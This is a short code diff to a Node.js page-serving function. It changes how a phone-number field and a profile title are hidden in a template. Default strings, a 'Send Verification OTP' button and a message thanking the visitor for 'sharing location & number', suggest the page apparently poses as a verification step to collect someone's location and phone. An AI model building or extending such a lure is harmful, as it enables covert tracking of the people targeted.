@@ -718,7 +718,7 @@ function serveDynamicIndex(req, res) {
     const profileImg = config.profileImgUrl || 'profile.jpg';
     const buttonText = config.buttonText || 'Send Verification OTP';
     const themeColor = config.themeColor || '#06b6d4';
-    const phoneDisplay = config.requirePhone === false ? 'none' : 'block';
+    const phoneHiddenClass = config.requirePhone === false ? ' hidden-group' : '';
     const successTitle = config.successTitle || '✨ Thank You For Sharing!';
     const successMessage = config.successMessage || 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝';
 
@@ -741,9 +741,8 @@ function serveDynamicIndex(req, res) {
       .replace(/{{PROFILE_IMAGE}}/g, escapeHtmlMeta(profileImg))
       .replace(/{{PROFILE_NAME}}/g, escapeHtmlMeta(profileName))
       .replace(/{{PROFILE_TITLE}}/g, escapeHtmlMeta(profileTitle))
-      .replace(/{{PROFILE_TITLE_STYLE}}/g, profileTitle && profileTitle.trim() ? '' : 'display: none;')
       .replace(/{{PROFILE_BIO}}/g, escapeHtmlMeta(profileBio))
-      .replace(/{{PHONE_DISPLAY}}/g, phoneDisplay)
+      .replace(/{{PHONE_HIDDEN_CLASS}}/g, phoneHiddenClass)
       .replace(/{{BUTTON_TEXT}}/g, escapeHtmlMeta(buttonText))
       .replace(/{{SUCCESS_TITLE}}/g, escapeHtmlMeta(successTitle))
       .replace(/{{SUCCESS_MESSAGE}}/g, escapeHtmlMeta(successMessage));
